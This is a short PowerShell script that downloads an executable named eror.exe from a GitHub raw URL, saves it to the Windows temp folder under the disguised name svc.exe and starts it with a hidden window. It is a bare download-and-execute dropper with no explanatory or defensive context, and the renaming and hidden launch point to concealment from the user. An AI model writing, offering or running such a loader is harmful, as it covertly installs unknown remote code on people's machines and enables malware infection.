$url = "https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe"
$path = "$env:TEMP\svc.exe"
Invoke-RestMethod -Uri $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
